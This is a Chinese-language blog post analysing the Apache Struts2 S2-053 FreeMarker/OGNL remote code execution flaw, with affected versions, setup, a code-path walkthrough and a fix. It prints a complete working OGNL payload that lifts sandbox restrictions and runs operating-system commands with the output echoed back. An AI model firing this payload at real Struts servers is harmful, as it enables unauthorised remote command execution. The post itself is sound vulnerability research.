---
layout:     post
title:      "Apache Struts2 Remote Code Execution (S2-053) "
subtitle:   "Analysis of the Vulnerabilities"
date:       2017-09-15
author:     "Urahara"
categories: [Struts2, Remote Code Execution, Java Security]



---

### Versions Affected

```
Struts 2.0.1 - Struts 2.3.33, 
Struts 2.5 - Struts 2.5.10
```

### Description

> A possible Remote Code Execution attack when using an unintentional expression in Freemarker tag instead of string literals
>
> When using expression literals or forcing expression in Freemarker tags (see example below) and using request values can lead to RCE attack.

```php+HTML
<@s.hidden name="redirectUri" value=redirectUri />

<@s.hidden name="redirectUri" value="${redirectUri}" />

<@s.hidden name="${redirectUri}"/>
```

根据官方表述该漏洞主要是Freemarker模板语言的一个特性，被开发人员错误利用导致因传入ognl表达式而造成RCE的风险，所以再结合官方给出的错误编码示例，很容易猜测到这个漏洞首先是一个安全编码导致的问题，而非struts2通杀漏洞，因此官方对该漏洞的风险定级为中危。

在java领域，表现层技术主要有三种：jsp、freemarker、velocity。Struts2使用FreeMarker作为其默认的模板引擎，FreeMarker负责将数据模型中的数据合并到模板中，从而生成标准输出，对于界面开发人员而言，他们只关心界面（也就是模板文件）的开发，而无需理会底层数据，而对于业务逻辑开发者，他们只需要关心负责将需要显示的数据填入数据模型即可，对于传统的jsp页面而言，FreeMarker是一个绝佳的替代方案。

### Vulnerability Environment

根据官方的漏洞表述，我们使用struts-2.5.10版本，写一个在FreeMarker中使用Struts2标签的ftl模板文件，功能比较简单获取name并输出

![freemarker-ftl](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-freemarker-ftl.png)

在 Action 中，为了将name值传到以上的Freemarker 模板中，将name值绑定到相应的属性中即可， action 代码如下：

![freemarker-java](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-freemarker-java.png)

这样一个漏洞环境就搭建好了，接下来就是进行漏洞测试和分析

### Vulnerability Analysis

漏洞利用很简单，提交`%{2*333}`观察返回name值，表达式被正确执行即可

![freemarker-page](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-freemarker-page.png)

POC同s2-045就可以，带回显POC如下：

```java
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ipconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

我们知道在ftl模板里${···}本身就是ognl表达式，所以这个漏洞没有什么可以去分析的漏洞触发机制，不过作为struts2的ognl表达式执行漏洞学习案例还是不错的，很直接！

先看\org\apache\struts2\views\freemarker\ScopesHashModel.class，Struts2 Action get从前台获取到参数内容后，会先获得用户提交的参数名，然后从值栈（Value Stack）中找到符合参数值的内容（ognl），其中主要用到ValueStack的findValue方法

![s2-053-analysis1](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-analysis1.png)

当action处理完成后，调用set方法。这里需要注意在Component类的copyParams方法，其中用到了setValue来处理，所以action的实例变量可以被OGNL访问

![s2-053-analysis2](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-analysis2.png)

同样的在OgnlValueStack中的setValue再进行处理，继续跟进最后发现被OgnlUtil中的setValue来传递ognl表达式

最终ognl表达式被OgnlValueStack中的findValue所执行，因为POC不是以#开头，会把expr当做key值到contextMap中找，再次过程中ognl表达式被执行。

![s2-053-analysis3](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-analysis3.png)

### Solution

首先你可以进行struts2版本升级，其中对freemarker配置中进行了更多的限制，其次本文开始就说了，这首先是一个安全编码的问题，正确的标签使用方法如下：

![solution](http://reverse-tcp.xyz/static/img/_posts/struts2/s2-053-solution.png)







